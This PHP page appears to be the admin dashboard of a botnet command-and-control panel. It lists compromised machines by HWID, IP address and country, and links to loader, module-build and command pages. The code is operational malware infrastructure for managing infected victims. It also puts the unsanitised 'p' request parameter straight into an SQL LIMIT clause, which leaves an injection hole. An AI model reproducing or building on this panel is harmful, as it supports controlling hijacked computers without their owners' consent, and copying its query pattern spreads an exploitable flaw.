<?php
    session_start();
    if($_SESSION['auth'] != 'true'){
        header("Location: index.php");
        die();
    }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title></title>

    <!-- Bootstrap -->

    <link href="css/style_table.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.css" rel="stylesheet">
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

    <script src="js/bootstrap.js"></script>
	<style>[class="cbalink"]{display:none;}</style>
  </head>
    <body style = "background-color: #ffffff">
    <nav class="navbar navbar-inverse";">
        
            <div class="container-fluid" style = "background-color: #ffffff">               
                <ul class="nav navbar-nav">
				<li><a href="loader.php" style="color: black">Loader</a></li>
				<li><a href="antidel.php" style="color: black">Модуль</a></li>
				<li><a href="module.php" style="color: black">Модуль (Билд)</a></li>
				<li><a href="logout.php" style="color: black">Выйти</a></li>
                
                </ul>
            </div>
        </nav>
        <div class="container">
           <div class="row">
                <?php
                include('config.php');
                $logs = 0;       
                $q = mysql_query("SELECT * FROM `bots` WHERE `checked`='false'");

                $logs = mysql_num_rows($q);
                for ($i = 0; $i < $logs; $i++)
                {
                    $log = mysql_fetch_assoc($q);              
                }
                print 
                '
                <div style="color: black; font-size: 15pt">All bots:'.$logs.'</div>
                ';
                ?>
            </div>
            <form action="cmd.php" method="post">
                <input type="hidden" name="del" value="1">
            </form> 
            <br>          
            <table class="table table-bordered">
                <thead>
                <tr>
                    <th style="color: black">ID</th>
                    <th style="color: black">HWID</th>
                    <th style="color: black">IP</th>
                    <th style="color: black">Страна</th>
                </tr>					
                </thead>
                <tbody>
                    <?php
                        include('config.php');
                        $workers;
                        $p1 = 0;
                        $p2 = 0;
                        if(isset($_GET['p'])){
                            $p1 = $_GET['p'];
                            $t1 = $_GET['p'] * 10;
                            $workers = mysql_query("SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT $t1, 10");
                        }
                        else{
                            $workers = mysql_query("SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT 10");
                        }
                        
                        for ($i = 0; $i < mysql_num_rows($workers); $i++)
						{
                            $curr = mysql_fetch_assoc($workers);

                            echo
                            "
                            <tr style=\"background-color: #ffffff; opacity: 0.9;\">
                            <td><strong>".$curr['id']."</strong></td>
                            <td><strong>".$curr['hwid']."</strong></td>
                            <td><strong>".$curr['ip']."</strong></td>
                            <td><strong>".$curr['country']."</strong></td>    
                            </tr>
                            ";
                        }
                         if(mysql_num_rows(mysql_query("SELECT * FROM `bots`")) > 10){
                            $p11 = $p1 - 1;
                            $p1 += 1;
                            echo
                            "
                            <ul class=\"pager\">
                                <li><a href=\"?p=$p11\">Назад</a></li>
                                <li><a href=\"?p=$p1\">Дальше</a></li>
                            </ul>
                            ";
                        }

                    ?>
                </tbody>
            </table>
        </div>
		
        <?php
        mysql_close($dbcnx);
        ?>
    </body>
</html>